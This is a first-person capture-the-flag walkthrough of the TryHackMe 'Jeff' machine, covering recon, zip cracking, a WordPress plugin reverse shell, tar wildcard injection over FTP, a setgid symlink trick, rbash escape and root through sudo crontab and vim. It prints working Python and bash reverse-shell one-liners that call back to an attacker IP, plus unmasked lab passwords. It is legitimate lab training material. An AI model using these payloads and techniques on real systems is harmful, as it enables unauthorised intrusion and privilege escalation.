# JEFF

First of all, I went on the IP address using browser and it appeared a white page. So I analyzed the html code and I found this comment.

<div><p align="center"><img  src="img/comment.png" /></div>

I added that address in my `/etc/hosts` on my kali machine and then I reloaded the page.

<div><p align="center"><img  src="img/jeff_home_page.png" /></div>

Meanwhile I had launched a scan to see the active services on the host and I found ports `80` and `22` open.

```
$ sudo nmap -Pn -sS --max-retries 1 --min-rate 20 -p- 10.10.147.129      
[sudo] password for ale: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-22 16:57 CEST
Nmap scan report for 10.10.147.129 (10.10.147.129)
Host is up (0.061s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

I ran another scan only on those two ports to see the versions of the active services.
```
$ nmap -Pn -sC -sV -p 22,80 10.10.147.129                     
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-22 17:07 CEST
Nmap scan report for jeff.thm (10.10.147.129)
Host is up (0.056s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7e435f1e58a8fcc9f7fd4b400b837932 (RSA)
|   256 5c7992dde9d1465070f0346226f06939 (ECDSA)
|_  256 ced9822b695f82d0f55c9b3ebe7688c3 (ED25519)
80/tcp open  http    nginx
|_http-title: Jeffs Portfolio
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

I didn't get any more information at the moment, so I ran one last scan with the `--script vuln` flag looking for known vulnerabilities.

```
$ nmap -Pn --script vuln -p 22,80 10.10.147.129
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-22 17:09 CEST
Nmap scan report for jeff.thm (10.10.147.129)
Host is up (0.056s latency).

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
| http-enum: 
|   /admin/: Possible admin folder
|   /admin/login.php: Possible admin folder
|   /admin/index.html: Possible admin folder
|   /backups/: Possible backup
|_  /uploads/: Potentially interesting folder
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-vuln-cve2011-3192: 
|   VULNERABLE:
|   Apache byterange filter DoS
|     State: VULNERABLE
|     IDs:  BID:49303  CVE:CVE-2011-3192
|       The Apache web server is vulnerable to a denial of service attack when numerous
|       overlapping byte ranges are requested.
|     Disclosure date: 2011-08-19
|     References:
|       https://www.securityfocus.com/bid/49303
|       https://www.tenable.com/plugins/nessus/55976
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
|_      https://seclists.org/fulldisclosure/2011/Aug/175
|_http-csrf: Couldn't find any CSRF vulnerabilities.
```

From the scan results, the scanned apache version is vulnerable to CVE-2011-3192. Being a DOS-type vulnerability, it is not of interest to this penetration test, but it should still be documented.

Anyway, I also inspected the directories found by nmap, at first glance the `/admin` and `/backups/` directories don't seem very useful, while in the `/uploads/` directory there is a file upload form.

I uploaded some files via the upload form but I still don't know where they are saved. So after a couple of tries I changed my strategy, I ran some spider attacks on the various directories and I found a file called `backup.zip` in the `/backups/` directory.

```
$ ffuf -w directory-list-2.3-medium.txt -u http://jeff.thm/backups/FUZZ -e .php,.html,.txt,.zip 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://jeff.thm/FUZZ
 :: Wordlist         : FUZZ: /home/ale/tools/directory-list-2.3-medium.txt
 :: Extensions       : .php .html .txt 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________
 
 ...

 [Status: 200, Size: 9, Words: 1, Lines: 2, Duration: 68ms]
    * FUZZ: #.zip

[Status: 200, Size: 9, Words: 1, Lines: 2, Duration: 68ms]
    * FUZZ: #.php

[Status: 200, Size: 9, Words: 1, Lines: 2, Duration: 68ms]
    * FUZZ: index.html

[Status: 200, Size: 9, Words: 1, Lines: 2, Duration: 71ms]
    * FUZZ: #.txt

[Status: 200, Size: 62753, Words: 245, Lines: 238, Duration: 59ms]
    * FUZZ: backup.zip
```

I downloaded the file and tried to extract it, but I need a password to do so.

```
$ unzip backup.zip 
Archive:  backup.zip
   creating: backup/
   creating: backup/assets/
[backup.zip] backup/assets/EnlighterJS.min.css password: 
```

To find the password I decided to use john the ripper. First I converted the zip file into a format that john understands using the `zip2john` tool. 

```
$ zip2john backup.zip > hashes
ver 1.0 backup.zip/backup/ is not encrypted, or stored with non-handled compression type
ver 1.0 backup.zip/backup/assets/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 backup.zip/backup/assets/EnlighterJS.min.css PKZIP Encr: TS_chk, cmplen=6483, decmplen=34858, crc=541FD3B0 ts=7A80 cs=7a80 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/backup/assets/EnlighterJS.min.js PKZIP Encr: TS_chk, cmplen=14499, decmplen=49963, crc=545D786A ts=7A80 cs=7a80 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/backup/assets/MooTools-Core-1.6.0-compressed.js PKZIP Encr: TS_chk, cmplen=27902, decmplen=89614, crc=43D2FC37 ts=7A80 cs=7a80 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/backup/assets/profile.jpg PKZIP Encr: TS_chk, cmplen=10771, decmplen=11524, crc=F052E57A ts=7A80 cs=7a80 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/backup/assets/style.css PKZIP Encr: TS_chk, cmplen=675, decmplen=1439, crc=9BA0C7C1 ts=7A80 cs=7a80 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/backup/index.html PKZIP Encr: TS_chk, cmplen=652, decmplen=1178, crc=39D2DBFF ts=7A80 cs=7a80 type=8
ver 1.0 efh 5455 efh 7875 ** 2b ** backup.zip/backup/wpadmin.bak PKZIP Encr: TS_chk, cmplen=53, decmplen=41, crc=FAECFEFB ts=7A80 cs=7a80 type=0
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
```

Then with `john` and the rockyou wordlist I found the password and I extracted the files from the archive.

```
$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
**************  (backup.zip)     
1g 0:00:00:02 DONE (2023-07-22 18:19) 0.4761g/s 6830Kp/s 6830Kc/s 6830KC/s "2parrow"..*7¡Vamos!
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

In the archive I found this file which contains another password, but at the moment I don't know where to use it. I need to do more research

```
$ cat wpadmin.bak 
wordpress password is: ***************** 
```

I didn't find any wordpress directories. Since I'm using a domain name, I tried to find if there was any subdomain that contained the wordpress site, after all jeff on his homepage wrote that he was working on a new version. So I used ffuf and found `wordpress.jeff.thm` and added it in the `/etc/hosts` file.

```
$ ffuf -w ~/tools/directory-list-2.3-medium.txt -u http://jeff.thm -H "Host: FUZZ.jeff.thm" -ac          

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://jeff.thm
 :: Wordlist         : FUZZ: /home/ale/tools/directory-list-2.3-medium.txt
 :: Header           : Host: FUZZ.jeff.thm
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 200, Size: 25901, Words: 1212, Lines: 347, Duration: 89ms]
    * FUZZ: wordpress
```

* `-H` "Host: FUZZ.jeff.thm": This option sets a custom header to the request. It uses the FUZZ keyword, which will be replaced by the values from the wordlist during the fuzzing process. The header being set in this case is Host, with the value FUZZ.jeff.thm. So, FUZZ will be replaced with each word from the wordlist during the fuzzing.
* `-ac`: This option stands for "Auto-Calibration." It tells ffuf to automatically calibrate the number of connections to optimize the fuzzing speed.

BINGO! I can continue from here.

<div><p align="center"><img  src="img/wordpress.png" /></div>

I went to the `wp-admin` page and logged in using the password found in the .bak file. Since I'm authenticated, I tried to load a reverse shell by inserting some php code in the index.php page, but it was not possible. There must be some restriction preventing me from editing the php.

<div><p align="center"><img  src="img/update_fail.png" /></div>

I looked for other ways to upload PHP code and found the installed plugins section. One of the installed plugins is "hello dolly", I think it's a default plugin, so I modified the code of the `hello.php` page and managed to load my reverse shell.

<div><p align="center"><img  src="img/update_ok.png" /></div>

Finally I activated the plugin in the "Installed plugin" page, on my terminal I listened with netcat, and I got the connection.

```
$ rlwrap nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.9.15.73] from (UNKNOWN) [10.10.255.36] 58852
Linux Jeff 4.15.0-101-generic #102-Ubuntu SMP Mon May 11 10:07:26 UTC 2020 x86_64 GNU/Linux
 14:31:54 up 5 min,  0 users,  load average: 0.04, 0.22, 0.13
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```
On the victim machine I ran linpeas, which highlighted the hardcoded database credentials in a `/var/www/html/wp-config.php`.
```
╔══════════╣ Analyzing Wordpress Files (limit 70)
-rw-r--r-- 1 www-data www-data 3198 Jul 23 14:27 /var/www/html/wp-config.php                                                                                                                                                                
define( 'DB_NAME', 'exampledb');                                                
define( 'DB_USER', 'exampleuser');
define( 'DB_PASSWORD', 'examplepass');
define( 'DB_HOST', 'db');
```
I also found credentials for an ftp server on `/var/www/html/ftp_backup.php`. It appears that this file has not yet been completed.

```php
<?php
/* 
    Todo: I need to finish coding this database backup script.
          also maybe convert it to a wordpress plugin in the future.
*/
$dbFile = 'db_backup/backup.sql';
$ftpFile = 'backup.sql';

$username = "backupmgr";
$password = "******************";()

$ftp = ftp_connect("172.20.0.1"); // todo, set up /etc/hosts for the container host

if( ! ftp_login($ftp, $username, $password) ){
    die("FTP Login failed.");
}

$msg = "Upload failed";
if (ftp_put($ftp, $remote_file, $file, FTP_ASCII)) {
    $msg = "$file was uploaded.\n";
}

echo $msg;
ftp_close($conn_id); 
```

Also, from this comment I understand that we are inside a container.

```php
$ftp = ftp_connect("172.20.0.1"); // todo, set up /etc/hosts for the container host
```

Since the `ftp` command is not installed on the machine, I searched on internet for alternatives ways to connect to an ftp server, and I remembered that I can do this using the `curl` command. So I found that on the ftp server there is an empty folder called `files/`.

```
$ curl -v -s -P- 'ftp://backupmgr:******************@172.20.0.1/'
* Expire in 0 ms for 6 (transfer 0x55c2f1276f50)
*   Trying 172.20.0.1...
* TCP_NODELAY set
* Expire in 200 ms for 4 (transfer 0x55c2f1276f50)
* Connected to 172.20.0.1 (172.20.0.1) port 21 (#0)
< 220 Welcome to Jeff's FTP service.
> USER backupmgr
< 331 Please specify the password.
> PASS SuperS1ckP4ssw0rd123!
< 230 Login successful.
> PWD
< 257 "/" is the current directory
* Entry path is '/'
> EPRT |1|172.20.0.6|34181|
* ftp_perform ends with SECONDARY: 1
< 200 EPRT command successful. Consider using EPSV.
* Connect data stream actively
> TYPE A
< 200 Switching to ASCII mode.
> LIST
< 150 Here comes the directory listing.
* Maxdownload = -1
* Preparing for accepting server on data port
* Checking for server connect
* Ready to accept data connection from server
* Connection accepted from server
{ [63 bytes data]
* Remembering we are in dir ""
< 226 Directory send OK.
* Connection #0 to host 172.20.0.1 left intact
drwxr-xr-x    2 1001     1001         4096 May 18  2020 files
```

Later, with the help of linpeas, I found out that in the `/usr/lib/` folder there is `python3.7/` folder. This could make my life a lot easier.

```
$ cd /usr/lib/python3.7
$ python3.7 --version
Python 3.7.3
$ python3.7 -c 'import pty; pty.spawn("/bin/bash");'
www-data@Jeff:/usr/lib/python3.7$ ls -l
www-data@Jeff:/usr/lib/python3.7$ export PATH=/usr/lib/python3.7:$PATH
```
I could use python to interact with webserver. First of all, I checked if I have write permission on the server and the answare is YES. 

At this point I was stuck, so I searched for help on internet and I found this [hint](https://marcorei7.wordpress.com/2021/03/02/111-jeff/). It looks just like another person who, like me, got stuck and looked for help on the internet :').

*As per usual I wanted to upload a reverse shell to gain further access. But here I had no possibility to execute it directly. I spend a ton of time to find more out but I was stuck. The only hint I got here was, that there should be a hidden cronjob running at the other end. And it made so much sense and because I didn’t know, what to upload or how to name it, I assumed that it was a wildcard cronjob picking every file up. For the wildcard injection I once again used this awesome post on [hackingarticles](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/) and created a Python script to do the work for me.*

Anyway, I didn't read further to avoid spoiling the whole solution and I assumed that there was a cronjob running on the other machine (though I would like to understand how I was supposed to understand this). I wrote a simple bash script to start a reverse shell and I downloaded it on victim machine via `curl` command and uploaded it to ftp server via using `python` and `ftlib`.

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.15.73",4545));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Reading this [article](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/) on wildcar injection, I wrote this simple python script.

```python
from ftplib import FTP
import io
 
ftp = FTP('172.20.0.1')
ftp.login('backupmgr', '************************') 
ftp.set_pasv(False)
ftp.cwd('files')
 
shellfile = 'rev_shell.sh'
wildcard1 = '--checkpoint=1'
wildcard2 = '--checkpoint-action=exec=sh rev_shell.sh'
 
ftp.storlines('STOR ' + shellfile, open(shellfile, 'rb'))
ftp.storlines('STOR ' + wildcard1, open(wildcard1, 'rb'))
ftp.storlines('STOR ' + wildcard2, open(wildcard2, 'rb'))
 
ftp.dir()
ftp.quit()

```

From what I understand, reading jeff's comment in the file with the ftp credentials, it is possible to understand that he is creating a sort of backup system and therefore it si possible to must assume that there is a cronjob that creates and extracts archives repeatedly with the `tar` command (or zip, you have to do some tests). So it is possible to perform a wildacrd injection using files with "malicious" names to make the tar command execute my reverse shell.

I downloaded that script on target machine and I created other two malicious files.

```
www-data@Jeff:/tmp$ echo "" >> "--checkpoint=1"
www-data@Jeff:/tmp$ echo "" > "--checkpoint-action=exec=sh rev_shell.sh"
```

After that, I start a netcat listener on port 4545 on my local machine and I run the python script.

```
www-data@Jeff:/tmp$ python3.7 upload.py
python3.7 upload.py
-rwxr-xr-x    1 1001     1001            2 Jul 25 08:51 --checkpoint-action=exec=sh rev_shell.sh
-rwxr-xr-x    1 1001     1001            2 Jul 25 08:51 --checkpoint=1
-rwxr-xr-x    1 1001     1001           55 Jul 25 08:51 rev_shell.sh
```

Now that I have uploaded all the necessary files to the ftp server, if the hypotheses are correct, all that remains is to wait for the cronjob to be executed and consequently my `rev_shell.sh` file.

```
$ rlwrap nc -lnvp 4545       
listening on [any] 4545 ...
connect to [10.9.15.73] from (UNKNOWN) [10.10.112.1] 42210
/bin/sh: 0: can't access tty; job control turned off
$ whoami
backupmgr
```

During my researches I found a strange script owned by root in `/home/backupmgr/.tmp/` directory.

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.2.12",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

It is clearly a python reverse shell, now I don't know if it could be usefull. Unfortunately I don't have write permissions on it.

For a deeper analysis I ran linpeas again, but this time with the backupmgr user which has higher permissions.
Based on its output, it seems that the FTP server's configuration file (/etc/vsftpd.conf) allows anonymous access.
```
╔══════════╣ Analyzing FTP Files (limit 70)
-rw-r--r-- 1 root root 5985 May 18  2020 /etc/vsftpd.conf                                                                                                                                                                                   
anonymous_enable
local_enable=YES
write_enable=YES
#anon_upload_enable=YES
#anon_mkdir_write_enable=YES
#chown_uploads=YES
#chown_username=whoever
```

These are the network ports on which processes are actively listening for incoming connections

```
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                                                                                                           
tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:44215         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
```

There are two suspicious ports:
* A process is listening on TCP port 44215 on the loopback interface (127.0.0.1). It is actively waiting for incoming connections.
* There is a process listening on TCP port 8080 on the loopback interface (127.0.0.1). It is actively waiting for incoming connections.

On port 8080 there appears to be nothing, and the other appears to be closed.

On second thought, I've decided to focus on the jeff user (I learned about it thanks to linpeas, but it was also enough to check the home/ folder) and drop the root user for now. I searched all files owned by jeff and found something interesting.

```
backupmgr@tryharder:/home$ find / -user jeff -ls 2>/dev/null
find / -user jeff -ls 2>/dev/null
   795410      4 drwxrwxrwx   2 jeff     jeff         4096 May 24  2020 /opt/systools
   795411     20 -rwxr-sr-x   1 jeff     pwman       17160 May 24  2020 /opt/systools/systool
  1573629      4 drwx------   5 jeff     jeff         4096 May 18  2020 /home/jeff
  1056230      4 -rwxr-x---   1 jeff     pwman          43 May 11  2020 /var/backups/jeff.bak
```

The systool file appears to have the s bit set by user jeff. This means that I can execute that file with jeff's permissions.
There is also a file called message.txt which contains this message.

```
Jeff, you should login with your own account to view/change your password. I hope you haven't forgotten it.
```
It appears to be a message for jeff, probably written by the system administrator.
```
backupmgr@tryharder:/opt/systools$ ./systool
./systool
Welcome to Jeffs System Administration tool.
This is still a very beta version and some things are not implemented yet.
Please Select an option from below.
1 ) View process information.
2 ) Restore your password.
3 ) Exit
Chose your option: 2
2


Jeff, you should login with your own account to view/change your password. I hope you haven't forgotten it.
```
So that file was not just a warning but a message that is part of this program... Damn!

To better understand how this executable works I converted it to base64, copied the contents to a file on my local machine and decrypted it, getting the executable back. But there was nothing hidden, the executable reads the message.txt file when number 2 is input.

I remembered that another file owned by jeff was the file `jeff.bak`, on which I don't have read permissions.

```
backupmgr@tryharder:/var/backups$ file jeff.bak
jeff.bak: regular file, no read permission
```
After a while I realized that I could get the file to be read via the systool executable since it runs with jeff permissions. So I deleted the message.txt file and created a symlink with the same name to the .bak file.
```
backupmgr@tryharder:/opt/systools$ mv message.txt
backupmgr@tryharder:/opt/systools$ ln -s /var/backups/jeff.bak message.txt
backupmgr@tryharder:/opt/systools$ ll
total 28
drwxrwxrwx 2 jeff      jeff       4096 Jul 26 13:55 ./
drwxr-xr-x 4 root      root       4096 May 24  2020 ../
lrwxrwxrwx 1 backupmgr backupmgr    21 Jul 26 13:55 message.txt -> /var/backups/jeff.bak*
-rwxr-sr-x 1 jeff      pwman     17160 May 24  2020 systool*
```
I re-launched the executable and chose option 2. The .bak file is nothing more than a text file containing a password.
```
backupmgr@tryharder:/opt/systools$ ./systool
./systool
Welcome to Jeffs System Administration tool.
This is still a very beta version and some things are not implemented yet.
Please Select an option from below.
1 ) View process information.
2 ) Restore your password.
3 ) Exit 
Chose your option: 2
2


Your Password is: ************************


1 ) View process information.
2 ) Restore your password.
3 ) Exit 
```
Finally I was able to elevate my privileges and become jeff on the target system.
```
backupmgr@tryharder:/opt/systools$ su jeff
Password:
jeff@tryharder:/opt/systools$ whoami
jeff
```
It uses a shell called rbash and I'm not able to use the cd command to move around, but I have no problem using the ll command. In fact, I could see the files in jeff's home and read the user.txt file.

```
jeff@tryharder:/opt/systools$ cd ..
rbash: cd: restricted
jeff@tryharder:/opt/systools$ ll /home/jeff
total 40
drwx------ 5 jeff jeff 4096 May 18  2020 ./
drwxr-xr-x 4 root root 4096 May 10  2020 ../
lrwxrwxrwx 1 root root    9 May 10  2020 .bash_history -> /dev/null
-rw-r--r-- 1 jeff jeff  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 jeff jeff 3771 Apr  4  2018 .bashrc
drwxr-x--x 2 root root 4096 May 11  2020 .bin/
drwx------ 2 jeff jeff 4096 May  9  2020 .cache/
drwx------ 3 jeff jeff 4096 May  9  2020 .gnupg/
-rw-r--r-- 1 root root  180 May 14  2020 .profile
-rw-r--r-- 1 root root   75 May 18  2020 .selected_editor
-rw-r----- 1 jeff jeff   36 May 11  2020 user.txt
jeff@tryharder:/opt/systools$ cat /home/jeff/user.txt
THM{************************************}
```
I tried putting the first flag on tryhackme, but it's not the right flag. At first I was strange, then I read the message between the brackets well and I understood.
I took that string and hash it using cyberchef.

<div><p align="center"><img  src="img/hashing.png" /></div>

To get a normal shell that would allow me to carry on with my searches without problems, I just typed the command `bash`.

```
jeff@tryharder:/opt/systools$ bash
bash
```
I found that user jeff can run `crontab` command with root permissions via sudo.
```
jeff@tryharder:/tmp$ sudo -l
[sudo] password for jeff:

Matching Defaults entries for jeff on tryharder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jeff may run the following commands on tryharder:
    (ALL) /usr/bin/crontab
```
The only problem was that I didn't have a stable shell and therefore the text editor didn't allow me to write the cronjob file. But since I know jeff's password I was able to ssh into it and have a stable shell.

```
$ ssh jeff@jeff.thm                   
jeff@jeff.thm's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Jul 26 14:33:54 UTC 2023

  System load:  0.09               Users logged in:                0
  Usage of /:   22.8% of 31.37GB   IP address for eth0:            10.10.213.27
  Memory usage: 41%                IP address for docker0:         172.17.0.1
  Swap usage:   0%                 IP address for br-9ab9d1baea74: 172.20.0.1
  Processes:    196


12 packages can be updated.
0 updates are security updates.


Last login: Mon May 18 12:22:14 2020 from 10.0.2.15
jeff@tryharder:~$ 
```
I thought I was done with the CTF, but as soon as I ssh'd in, and thus after getting a stable shell, I had a lot more restrictions.
```
jeff@tryharder:~$ sudo -l
-rbash: /usr/lib/command-not-found: restricted: cannot specify `/' in command names
jeff@tryharder:~$ bash
-rbash: /usr/lib/command-not-found: restricted: cannot specify `/' in command names
```

For some strange reason, through the pty shell obtained with python I could safely execute the bash command. So I went back to the previous shell and did some internet searching and found a way to change the default shell.

```
jeff@tryharder:/home/backupmgr$ chsh
Password: 123-My-N4M3-1z-J3ff-123

Changing the login shell for jeff
Enter the new value, or press ENTER for the default
        Login Shell [/bin/rbash]: /bin/bash
```

In the end I also had to change the PATH environment variable.

Jeff wanted to piss off until the end...
```
jeff@tryharder:~$ sudo -l
Command 'sudo' is available in '/usr/bin/sudo'
The command could not be located because '/usr/bin' is not included in the PATH environment variable.
sudo: command not found
jeff@tryharder:~$ export PATH=/usr/bin:$PATH
jeff@tryharder:~$ sudo -l
[sudo] password for jeff: 
Matching Defaults entries for jeff on tryharder:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jeff may run the following commands on tryharder:
    (ALL) /usr/bin/crontab
```
I added the final line to the `/etc/crontab` file.
```
# Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
# 
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').# 
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
# 
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
# 
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
# 
# For more information see the manual pages of crontab(5) and cron(8)
# 
# m h  dom mon dow   command

* * * * * bash -i >& /dev/tcp/10.9.15.73/4242 0>&1
```

Finally I managed to create a new cronjob with root permissions and now I just have to wait to receive the connection.

Obviously the cronjob didn't work...

After some hysterical laughter I remembered that the editor that starts when you run the `crontab` command is `vim`, and from vim it is possible to spawn a shell.

<div><p align="center"><img  src="img/shell_vim.png" /></div>

From here I got a fully functional root shell and read the last flag.

```
root@tryharder:/# cd root/
root@tryharder:/root# ll
total 44
drwx------  6 root root 4096 May 25  2020 ./
drwxr-xr-x 25 root root 4096 May 23  2020 ../
lrwxrwxrwx  1 root root    9 May 11  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 May 12  2020 .cache/
drwx------  3 root root 4096 May 12  2020 .gnupg/
drwxr-xr-x  3 root root 4096 May 14  2020 .local/
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
----------  1 root root  117 May 18  2020 root.txt
-rw-r--r--  1 root root   75 May 11  2020 .selected_editor
drwx------  2 root root 4096 May 18  2020 .ssh/
-rw-------  1 root root 1880 May 25  2020 .viminfo
root@tryharder:/root# cat root.txt 
THM{****************************}
```